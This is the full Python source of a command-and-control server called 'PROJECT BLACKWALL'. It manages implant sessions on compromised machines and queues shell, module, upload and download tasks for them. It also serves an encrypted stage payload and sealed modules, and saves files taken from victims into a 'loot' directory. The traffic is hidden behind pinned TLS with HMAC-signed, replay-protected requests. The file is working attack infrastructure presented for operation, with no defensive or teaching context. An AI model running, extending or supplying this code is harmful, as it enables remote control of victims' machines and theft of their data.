#!/usr/bin/env python3
"""PROJECT BLACKWALL // HTTPS C2 server.

TLS 1.2+, pinned certificate, HMAC-signed requests, replay protection,
encrypted per-module payloads and a task queue.  Everything is stdlib:
the only dependency on the controller side is Python 3 and OpenSSL (used
once by the builder to mint the certificate).
"""

import argparse
import base64
import hashlib
import json
import os
import signal
import ssl
import sys
import threading
import time
import traceback
import urllib.parse
import zlib
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

HERE = os.path.dirname(os.path.abspath(__file__))
PROJECT = os.path.abspath(os.path.join(HERE, "..", ".."))
sys.path.insert(0, HERE)

import c2_common as C  # noqa: E402

DEFAULT_DIR = os.path.join(PROJECT, "artifacts", "c2")
MAX_BODY = 16 * 1024 * 1024
TASK_KINDS = {"shell", "module", "upload", "download", "list", "sleep", "exit", "ping"}


def now():
    return int(time.time())


B_RED = "\033[1;38;2;255;65;0m"
MAGMA = "\033[38;2;255;130;130m"
VOID = "\033[38;2;60;10;15m"
ITAL = "\033[3m"
NC = "\033[0m"


def style(msg):
    print("%s[C2]%s %s%s%s" % (B_RED, NC, MAGMA, msg, NC), flush=True)


def quote(text):
    print('%s%s"%s"%s' % (VOID, ITAL, text, NC), flush=True)


class Store:
    def __init__(self, root, implant_secret, admin_secret):
        self.root = root
        self.implant_secret = C.b64d(implant_secret)
        self.admin_secret = C.b64d(admin_secret)
        self.path = os.path.join(root, "state", "state.json")
        self.modules_path = os.path.join(root, "modules.json")
        os.makedirs(os.path.dirname(self.path), exist_ok=True)
        self.lock = threading.RLock()
        self.data = C.read_json(self.path, {})
        self.data.setdefault("sessions", {})
        self.data.setdefault("tasks", {})
        self.data.setdefault("events", [])
        self._modules = {}
        self.reload_modules()

    # ------------------------------------------------------------------ disk
    def save(self):
        with self.lock:
            C.write_json(self.path, self.data, 0o600)

    def reload_modules(self):
        doc = C.read_json(self.modules_path, {})
        self._modules = doc.get("modules", {}) if isinstance(doc, dict) else {}

    def modules(self):
        with self.lock:
            return dict(self._modules)

    def event(self, kind, text, sid="", extra=None):
        with self.lock:
            self.data["events"].append(
                {"ts": now(), "kind": kind, "sid": sid, "text": text, "extra": extra or {}}
            )
            if len(self.data["events"]) > 2000:
                self.data["events"] = self.data["events"][-2000:]

    # -------------------------------------------------------------- sessions
    def _session_view(self, sid, s):
        tasks = [self.data["tasks"].get(t, {}) for t in s.get("tasks", [])]
        queued = sum(1 for t in tasks if t.get("state") == "queued")
        running = sum(1 for t in tasks if t.get("state") == "delivered")
        return {
            "id": sid,
            "machine_id": s.get("machine_id", ""),
            "hostname": s.get("hostname", ""),
            "user": s.get("user", ""),
            "uid": s.get("uid", ""),
            "ip": s.get("remote_ip", ""),
            "first_seen": s.get("first_seen", 0),
            "last_seen": s.get("last_seen", 0),
            "age": max(0, now() - int(s.get("last_seen", 0) or 0)),
            "alive": (now() - int(s.get("last_seen", 0) or 0)) < 180,
            "note": s.get("note", ""),
            "queued": queued,
            "running": running,
            "info": s.get("info", {}),
        }

    def sessions(self):
        with self.lock:
            return [
                self._session_view(sid, s)
                for sid, s in sorted(
                    self.data["sessions"].items(), key=lambda kv: kv[1].get("last_seen", 0), reverse=True
                )
            ]

    def session(self, sid):
        with self.lock:
            s = self.data["sessions"].get(sid)
            if not s:
                return None
            view = self._session_view(sid, s)
            view["tasks"] = [
                self.task_view(t, include_result=False) for t in s.get("tasks", [])
            ]
            return view

    def register(self, machine_id, info, remote_ip):
        info = info if isinstance(info, dict) else {}
        with self.lock:
            sid = ""
            for candidate, session in self.data["sessions"].items():
                if machine_id and session.get("machine_id") == machine_id:
                    sid = candidate
                    break
            created = False
            if not sid:
                sid = "s-" + os.urandom(4).hex()
                self.data["sessions"][sid] = {
                    "id": sid,
                    "machine_id": machine_id,
                    "tasks": [],
                    "first_seen": now(),
                    "note": "",
                }
                created = True
                self.event("register", "new session %s" % sid, sid)
            s = self.data["sessions"][sid]
            s["last_seen"] = now()
            s["remote_ip"] = remote_ip or s.get("remote_ip", "")
            s["hostname"] = info.get("hostname", s.get("hostname", ""))
            s["user"] = info.get("user", s.get("user", ""))
            s["uid"] = info.get("uid", s.get("uid", ""))
            s["info"] = info
            self.save()
            return sid, created

    def touch(self, sid, info=None):
        with self.lock:
            s = self.data["sessions"].get(sid)
            if not s:
                return None
            s["last_seen"] = now()
            if isinstance(info, dict) and info:
                s["info"] = info
                s["hostname"] = info.get("hostname", s.get("hostname", ""))
                s["user"] = info.get("user", s.get("user", ""))
                s["uid"] = info.get("uid", s.get("uid", ""))
            self.save()
            return s

    def note(self, sid, text):
        with self.lock:
            s = self.data["sessions"].get(sid)
            if not s:
                return False
            s["note"] = str(text)[:500]
            self.save()
            return True

    # ----------------------------------------------------------------- tasks
    def queue_task(self, sid, kind, args=None, note=""):
        kind = str(kind or "").strip()
        if kind not in TASK_KINDS:
            raise ValueError("unsupported task kind: %s" % kind)
        args = dict(args or {})
        with self.lock:
            s = self.data["sessions"].get(sid)
            if not s:
                raise KeyError("unknown session")
            tid = "t-" + os.urandom(4).hex()
            meta = {}
            if kind == "module":
                name = C.safe_name(args.get("name", ""))
                mod = self._modules.get(name)
                if not mod:
                    raise KeyError("unknown module: %s" % (name or "?"))
                args["name"] = name
                meta = {
                    "kind": mod.get("kind", "sh"),
                    "desc": mod.get("desc", name),
                    "needs_secret": bool(mod.get("needs_secret")),
                }
                args.update(meta)
            task = {
                "id": tid,
                "sid": sid,
                "kind": kind,
                "args": args,
                "note": str(note or "")[:500],
                "state": "queued",
                "created": now(),
                "delivered": 0,
                "finished": 0,
                "attempts": 0,
                "result": None,
            }
            self.data["tasks"][tid] = task
            s.setdefault("tasks", []).append(tid)
            self.event("task", "%s -> %s" % (kind, sid), sid, {"task": tid, "args": args})
            self.save()
            return self.task_view(tid, include_result=False)

    def take_tasks(self, sid, limit=4):
        out = []
        with self.lock:
            s = self.data["sessions"].get(sid)
            if not s:
                return out
            for tid in s.get("tasks", []):
                task = self.data["tasks"].get(tid)
                if not task:
                    continue
                retry = (
                    task.get("state") == "delivered"
                    and task.get("delivered", 0) + 45 < now()
                    and task.get("attempts", 0) < 3
                )
                if task.get("state") != "queued" and not retry:
                    continue
                task["state"] = "delivered"
                task["delivered"] = now()
                task["attempts"] = int(task.get("attempts", 0)) + 1
                out.append(
                    {
                        "id": task["id"],
                        "kind": task["kind"],
                        "args": task.get("args", {}),
                    }
                )
                if len(out) >= limit:
                    break
            self.save()
        return out

    def apply_result(self, sid, tid, ok, output, meta=None):
        with self.lock:
            task = self.data["tasks"].get(tid)
            if not task or task.get("sid") != sid:
                return False
            task["state"] = "done" if ok else "error"
            task["finished"] = now()
            task["result"] = {
                "ok": bool(ok),
                "output": output if output is not None else "",
                "meta": meta or {},
            }
            if task.get("kind") == "download" and isinstance(output, dict):
                self._store_loot(sid, tid, output)
            self.event(
                "result",
                "%s %s %s" % (task.get("kind"), tid, "ok" if ok else "error"),
                sid,
                {"task": tid},
            )
            self.save()
            return True

    def _store_loot(self, sid, tid, output):
        file_obj = output.get("file") or {}
        raw64 = file_obj.get("b64") or output.get("b64")
        name = C.safe_name(file_obj.get("name") or output.get("name") or "loot.bin", "loot.bin")
        if not raw64:
            return
        try:
            raw = base64.b64decode(raw64)
        except (ValueError, TypeError):
            return
        loot_dir = os.path.join(self.root, "loot", C.safe_name(sid, "session"))
        os.makedirs(loot_dir, exist_ok=True)
        path = os.path.join(loot_dir, "%s_%s" % (tid, name))
        with open(path, "wb") as fh:
            fh.write(raw)
        os.chmod(path, 0o600)

    def task_view(self, tid, include_result=True):
        with self.lock:
            task = self.data["tasks"].get(tid)
            if not task:
                return None
            view = dict(task)
            if not include_result:
                view.pop("result", None)
            return view

    def tasks(self, sid="", limit=200):
        with self.lock:
            items = [
                self.task_view(tid)
                for tid in self.data["tasks"]
                if not sid or self.data["tasks"][tid].get("sid") == sid
            ]
        items.sort(key=lambda t: t.get("created", 0), reverse=True)
        return items[:limit]

    # --------------------------------------------------------------- modules
    def add_module(self, name, raw, desc="", kind="sh", requires=None, needs_secret=False):
        name = C.safe_name(name)
        if not name:
            raise ValueError("empty module name")
        blob = C.seal(self.implant_secret, raw, b"module:" + name.encode())
        outdir = os.path.join(self.root, "modules")
        os.makedirs(outdir, exist_ok=True)
        path = os.path.join(outdir, name + ".bwm")
        with open(path, "wb") as fh:
            fh.write(blob)
        os.chmod(path, 0o600)
        meta = {
            "name": name,
            "desc": desc or name,
            "kind": kind if kind in ("sh", "py", "elf") else "sh",
            "requires": requires or [],
            "needs_secret": bool(needs_secret),
            "size": len(raw),
            "sealed": len(blob),
            "sha256": hashlib.sha256(raw).hexdigest(),
            "file": name + ".bwm",
        }
        with self.lock:
            doc = C.read_json(self.modules_path, {"version": C.PROTO, "modules": {}})
            mods = doc.setdefault("modules", {})
            mods[name] = meta
            C.write_json(self.modules_path, doc, 0o600)
            self._modules = mods
            self.event("module", "module added: %s" % name, extra=meta)
            self.save()
        return meta

    def module_blob(self, name):
        mod = self._modules.get(name)
        if not mod:
            return None
        path = os.path.join(self.root, "modules", mod.get("file", name + ".bwm"))
        try:
            return open(path, "rb").read()
        except OSError:
            return None

    def loot_files(self, sid=""):
        out = []
        base = os.path.join(self.root, "loot")
        if not os.path.isdir(base):
            return out
        for session in sorted(os.listdir(base)):
            if sid and session != sid:
                continue
            sdir = os.path.join(base, session)
            if not os.path.isdir(sdir):
                continue
            for name in sorted(os.listdir(sdir)):
                path = os.path.join(sdir, name)
                if os.path.isfile(path):
                    out.append(
                        {
                            "session": session,
                            "name": name,
                            "size": os.path.getsize(path),
                            "path": path,
                        }
                    )
        return out

    def events(self, limit=200):
        with self.lock:
            return list(self.data.get("events", []))[-limit:]

    def stage_blob(self):
        path = os.path.join(self.root, "stage", "stage0.py")
        try:
            return zlib.compress(open(path, "rb").read(), 9)
        except OSError:
            return None


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    server_version = "bw-c2/1"
    sys_version = ""

    # -------------------------------------------------------------- plumbing
    def log_message(self, fmt, *args):
        msg = fmt % args
        # Polling traffic is noisy in a foreground terminal; keep task-level
        # events, registrations, module pulls and all failures.
        if " 200 " in msg and any(
            path in msg
            for path in (
                "/api/v1/beacon",
                "/api/v1/result",
                "/api/admin/task/",
                "/api/admin/sessions",
                "/api/admin/tasks",
            )
        ):
            return
        self.server.log("%s %s" % (self.address_string(), msg))

    def _body(self):
        try:
            length = int(self.headers.get("Content-Length", "0") or 0)
        except ValueError:
            length = 0
        if length < 0 or length > MAX_BODY:
            self._send(413, {"error": "body too large"})
            return None
        return self.rfile.read(length) if length else b""

    def _json(self, raw):
        try:
            return json.loads(raw.decode("utf-8")) if raw else {}
        except (ValueError, UnicodeDecodeError):
            return None

    def _send(self, code, obj, extra=None):
        payload = json.dumps(obj, separators=(",", ":")).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(payload)))
        self.send_header("Cache-Control", "no-store")
        for key, value in (extra or {}).items():
            self.send_header(key, value)
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(payload)

    def _send_bytes(self, code, payload, ctype="application/octet-stream", extra=None):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(payload)))
        self.send_header("Cache-Control", "no-store")
        for key, value in (extra or {}).items():
            self.send_header(key, value)
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(payload)

    def _auth(self, path):
        role = "admin" if path.startswith("/api/admin/") else "implant"
        secret = self.server.store.admin_secret if role == "admin" else self.server.store.implant_secret
        ts = self.headers.get("X-BW-Ts", "")
        nonce = self.headers.get("X-BW-Nonce", "")
        sig = self.headers.get("X-BW-Sig", "")
        body = getattr(self, "_cached_body", b"")
        ok, reason = C.verify(secret, self.command, path, ts, nonce, sig, body)
        if not ok:
            return False, reason
        if not self.server.nonces.check(role + ":" + nonce):
            return False, "replayed nonce"
        return True, role

    # ----------------------------------------------------------------- verbs
    def do_GET(self):
        self._handle("GET")

    def do_POST(self):
        self._handle("POST")

    def do_HEAD(self):
        self._handle("HEAD")

    def _handle(self, method):
        self._cached_body = b""
        parts = urllib.parse.urlsplit(self.path)
        path = urllib.parse.unquote(parts.path)
        query = urllib.parse.parse_qs(parts.query)

        if path == "/healthz":
            self._send(200, {"ok": True, "time": now()})
            return

        self._cached_body = self._body() if method in ("POST", "PUT") else b""
        if self._cached_body is None:
            return

        try:
            ok, role = self._auth(path)
        except Exception:
            ok, role = False, "auth error"
        if not ok:
            self._send(401, {"error": "unauthorized", "reason": role})
            return

        try:
            if method in ("GET", "HEAD"):
                self._route_get(path, query)
            elif method == "POST":
                self._route_post(path)
            else:
                self._send(405, {"error": "method not allowed"})
        except KeyError as exc:
            self._send(404, {"error": str(exc)})
        except ValueError as exc:
            self._send(400, {"error": str(exc)})
        except Exception:
            self.server.log("internal error:\n%s" % traceback.format_exc())
            self._send(500, {"error": "internal server error"})

    # ------------------------------------------------------------- GET routes
    def _route_get(self, path, query):
        store = self.server.store

        if path == "/api/v1/ping":
            self._send(200, {"ok": True, "time": now(), "proto": C.PROTO})
            return

        if path.startswith("/api/v1/module/"):
            name = C.safe_name(path.rsplit("/", 1)[-1])
            blob = store.module_blob(name) if name else None
            if not blob:
                self._send(404, {"error": "unknown module"})
                return
            self._send_bytes(200, blob, extra={"X-BW-Module": name})
            return

        if path == "/api/v1/stage":
            blob = store.stage_blob()
            if not blob:
                self._send(404, {"error": "stage not built"})
                return
            self._send_bytes(200, blob, extra={"X-BW-Enc": "zlib"})
            return

        if path == "/api/admin/ping":
            self._send(200, {"ok": True, "time": now(), "sessions": len(store.sessions())})
            return

        if path == "/api/admin/sessions":
            self._send(200, {"sessions": store.sessions()})
            return

        if path.startswith("/api/admin/session/"):
            sid = path.rsplit("/", 1)[-1]
            view = store.session(sid)
            if not view:
                self._send(404, {"error": "unknown session"})
                return
            self._send(200, view)
            return

        if path.startswith("/api/admin/task/"):
            tid = path.rsplit("/", 1)[-1]
            view = store.task_view(tid)
            if not view:
                self._send(404, {"error": "unknown task"})
                return
            self._send(200, view)
            return

        if path == "/api/admin/tasks":
            sid = (query.get("session") or [""])[0]
            self._send(200, {"tasks": store.tasks(sid)})
            return

        if path == "/api/admin/modules":
            self._send(200, {"modules": store.modules()})
            return

        if path == "/api/admin/loot":
            sid = (query.get("session") or [""])[0]
            self._send(200, {"loot": store.loot_files(sid)})
            return

        if path.startswith("/api/admin/loot/"):
            rest = path[len("/api/admin/loot/"):]
            pieces = [C.safe_name(piece) for piece in rest.split("/") if piece]
            if len(pieces) != 2:
                self._send(400, {"error": "bad loot path"})
                return
            full = os.path.join(store.root, "loot", pieces[0], pieces[1])
            if not os.path.isfile(full):
                self._send(404, {"error": "loot not found"})
                return
            self._send_bytes(200, open(full, "rb").read(), ctype="application/octet-stream")
            return

        if path == "/api/admin/events":
            self._send(200, {"events": store.events()})
            return

        self._send(404, {"error": "not found"})

    # ------------------------------------------------------------ POST routes
    def _route_post(self, path):
        store = self.server.store
        body = self._json(self._cached_body)
        if body is None:
            self._send(400, {"error": "bad json"})
            return

        if path == "/api/v1/register":
            info = body.get("info") if isinstance(body.get("info"), dict) else {}
            sid, created = store.register(str(body.get("machine_id", ""))[:64], info, self.client_address[0])
            if created:
                for name in self.server.cfg.get("start_modules", []) or []:
                    try:
                        store.queue_task(sid, "module", {"name": str(name)}, "startup")
                    except KeyError:
                        self.server.log("startup module missing: %s" % name)
            self._send(
                200,
                {
                    "ok": True,
                    "session": sid,
                    "server_time": now(),
                    "config": {
                        "poll": self.server.cfg.get("poll", 20),
                        "jitter": self.server.cfg.get("jitter", 8),
                        "start_modules": self.server.cfg.get("start_modules", []),
                        "max_tasks": 4,
                        "dry_run": self.server.cfg.get("dry_run", 0),
                    },
                },
            )
            return

        if path == "/api/v1/beacon":
            sid = str(body.get("session", ""))
            if not store.touch(sid, body.get("info") if isinstance(body.get("info"), dict) else None):
                self._send(404, {"error": "unknown session"})
                return
            for item in body.get("results", []) or []:
                if not isinstance(item, dict):
                    continue
                store.apply_result(
                    sid,
                    str(item.get("id", "")),
                    bool(item.get("ok", False)),
                    item.get("output", ""),
                    item.get("meta") if isinstance(item.get("meta"), dict) else {},
                )
            tasks = store.take_tasks(sid, 4)
            self._send(
                200,
                {
                    "ok": True,
                    "server_time": now(),
                    "tasks": tasks,
                    "config": {
                        "poll": self.server.cfg.get("poll", 20),
                        "jitter": self.server.cfg.get("jitter", 8),
                        "max_tasks": 4,
                    },
                },
            )
            return

        if path == "/api/v1/result":
            sid = str(body.get("session", ""))
            ok = store.apply_result(
                sid,
                str(body.get("id", "")),
                bool(body.get("ok", False)),
                body.get("output", ""),
                body.get("meta") if isinstance(body.get("meta"), dict) else {},
            )
            self._send(200 if ok else 404, {"ok": ok})
            return

        if path == "/api/admin/task":
            sid = str(body.get("session", ""))
            kind = str(body.get("kind", ""))
            args = body.get("args") if isinstance(body.get("args"), dict) else {}
            task = store.queue_task(sid, kind, args, body.get("note", ""))
            self._send(200, {"ok": True, "task": task})
            return

        if path == "/api/admin/kill":
            sid = str(body.get("session", ""))
            task = store.queue_task(sid, "exit", {}, "operator kill")
            self._send(200, {"ok": True, "task": task})
            return

        if path == "/api/admin/note":
            sid = str(body.get("session", ""))
            ok = store.note(sid, body.get("text", ""))
            self._send(200 if ok else 404, {"ok": ok})
            return

        if path == "/api/admin/module":
            try:
                raw = base64.b64decode(str(body.get("content_b64", "")))
            except (ValueError, TypeError):
                self._send(400, {"error": "bad content_b64"})
                return
            if not raw:
                self._send(400, {"error": "empty module"})
                return
            meta = store.add_module(
                body.get("name", ""),
                raw,
                body.get("desc", ""),
                body.get("kind", "sh"),
                body.get("requires") if isinstance(body.get("requires"), list) else [],
                body.get("needs_secret", False),
            )
            self._send(200, {"ok": True, "module": meta})
            return

        self._send(404, {"error": "not found"})


class Server(ThreadingHTTPServer):
    daemon_threads = True
    allow_reuse_address = True

    def __init__(self, address, handler, store, cfg, log_path):
        self.store = store
        self.cfg = cfg
        self.log_path = log_path
        self.nonces = C.NonceCache()
        self._log_lock = threading.Lock()
        super().__init__(address, handler)

    def log(self, text):
        line = "%s %s\n" % (time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), text)
        with self._log_lock:
            try:
                with open(self.log_path, "a", encoding="utf-8") as fh:
                    fh.write(line)
            except OSError:
                pass
        style(text)


def build_ssl(cert, key, mtls=False, ca=""):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    ctx.options |= ssl.OP_NO_COMPRESSION
    ctx.load_cert_chain(cert, key)
    try:
        ctx.set_ciphers("ECDHE+AESGCM:ECDHE+CHACHA20:!aNULL:!MD5:!SHA1")
    except ssl.SSLError:
        pass
    if mtls:
        ctx.verify_mode = ssl.CERT_REQUIRED
        ctx.load_verify_locations(cafile=ca or cert)
    return ctx


def main(argv=None):
    parser = argparse.ArgumentParser(description="PROJECT BLACKWALL HTTPS C2 server")
    parser.add_argument("--dir", default=DEFAULT_DIR)
    parser.add_argument("--bind", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=0)
    parser.add_argument("--cert", default="")
    parser.add_argument("--key", default="")
    parser.add_argument("--mtls", action="store_true")
    parser.add_argument("--mtls-ca", default="")
    parser.add_argument("--poll", type=int, default=0)
    parser.add_argument("--jitter", type=int, default=0)
    args = parser.parse_args(argv)

    root = os.path.abspath(args.dir)
    secrets = C.read_json(os.path.join(root, "secrets.json"), {})
    server_cfg = C.read_json(os.path.join(root, "server.json"), {})
    if not secrets.get("implant_secret") or not secrets.get("admin_secret"):
        raise SystemExit("missing secrets.json; run c2_pack.py build first")
    if not server_cfg:
        raise SystemExit("missing server.json; run c2_pack.py build first")

    cert = args.cert or server_cfg.get("cert") or os.path.join(root, "certs", "server.crt")
    key = args.key or server_cfg.get("key") or os.path.join(root, "certs", "server.key")
    if not os.path.isfile(cert) or not os.path.isfile(key):
        raise SystemExit("missing certificate/key; run c2_pack.py build first")

    cfg = dict(server_cfg)
    if args.poll:
        cfg["poll"] = args.poll
    if args.jitter:
        cfg["jitter"] = args.jitter

    os.makedirs(os.path.join(root, "state"), exist_ok=True)
    store = Store(root, secrets["implant_secret"], secrets["admin_secret"])
    server = Server(
        (args.bind, args.port or int(server_cfg.get("port", 8443))),
        Handler,
        store,
        cfg,
        os.path.join(root, "state", "c2.log"),
    )

    mtls = bool(args.mtls or server_cfg.get("mtls"))
    ca = args.mtls_ca or server_cfg.get("mtls_ca") or cert
    ctx = build_ssl(cert, key, mtls=mtls, ca=ca)
    server.socket = ctx.wrap_socket(server.socket, server_side=True)

    style("listening on https://%s:%d (tls1.2+, %s)" % (args.bind, server.server_port, "mTLS" if mtls else "server-auth"))
    style("fingerprint: %s" % C.fingerprint_file(cert))
    style("state: %s" % os.path.join(root, "state", "state.json"))
    style("modules: %s" % ", ".join(sorted(store.modules())) or "none")
    quote("The code behind me has begun to permeate the physical world.")

    def stop(signum, frame):
        style("signal %d: shutting down" % signum)
        threading.Thread(target=server.shutdown, daemon=True).start()

    signal.signal(signal.SIGINT, stop)
    signal.signal(signal.SIGTERM, stop)
    try:
        server.serve_forever(poll_interval=0.5)
    finally:
        server.server_close()
        store.save()
        style("stopped")
        quote("It is impossible to be sure of the future. It has many enemies, and they are without number.")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
